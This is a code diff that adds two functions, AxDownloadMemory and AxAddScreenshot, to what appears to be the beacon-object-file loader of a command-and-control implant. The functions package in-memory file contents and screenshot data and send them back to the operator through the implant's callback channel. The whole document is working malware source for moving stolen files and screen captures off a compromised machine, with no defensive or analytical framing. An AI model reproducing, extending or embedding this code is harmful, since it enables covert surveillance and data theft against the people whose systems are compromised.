@@ -717,3 +717,69 @@ auto Coff::Information( BEACON_INFO* info ) -> BOOL {
 
     return TRUE;
 }
+
+auto DECLFN Coff::AxDownloadMemory(
+    _In_ CHAR*       filename,
+    _In_ CHAR*       data,
+    _In_ INT32       length
+) -> VOID {
+    G_KHARON
+
+    if ( ! filename || ! data || length <= 0 ) {
+        KhDbg( "AxDownloadMemory: invalid parameters" );
+        return;
+    }
+
+    VOID* MemRange  = __builtin_return_address( 0 );
+    ULONG CommandID = Self->Cf->GetCmdID( MemRange );
+
+    PACKAGE* TmpPkg = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
+    if ( ! TmpPkg ) {
+        KhDbg( "AxDownloadMemory: package allocation failed" );
+        return;
+    }
+
+    TmpPkg->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
+    TmpPkg->Length = 0;
+
+    Self->Pkg->Str( TmpPkg, filename );
+    Self->Pkg->Bytes( TmpPkg, (BYTE*)data, (ULONG)length );
+
+    Self->Pkg->SendOut( CALLBACK_AX_DOWNLOAD_MEM, CommandID, (BYTE*)TmpPkg->Buffer, (INT32)TmpPkg->Length );
+
+    Self->Pkg->Destroy( TmpPkg );
+}
+
+auto DECLFN Coff::AxAddScreenshot(
+    _In_ CHAR*       note,
+    _In_ CHAR*       data,
+    _In_ INT32       length
+) -> VOID {
+    G_KHARON
+
+    if ( ! data || length <= 0 ) {
+        return;
+    }
+
+    if ( ! note ) {
+        note = (CHAR*)"";
+    }
+
+    VOID* MemRange  = __builtin_return_address( 0 );
+    ULONG CommandID = Self->Cf->GetCmdID( MemRange );
+
+    PACKAGE* TmpPkg = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
+    if ( ! TmpPkg ) {
+        return;
+    }
+
+    TmpPkg->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
+    TmpPkg->Length = 0;
+
+    Self->Pkg->Str( TmpPkg, note );
+    Self->Pkg->Bytes( TmpPkg, (BYTE*)data, (ULONG)length );
+
+    Self->Pkg->SendOut( CALLBACK_AX_SCREENSHOT, CommandID, (BYTE*)TmpPkg->Buffer, (INT32)TmpPkg->Length );
+
+    Self->Pkg->Destroy( TmpPkg );
+}
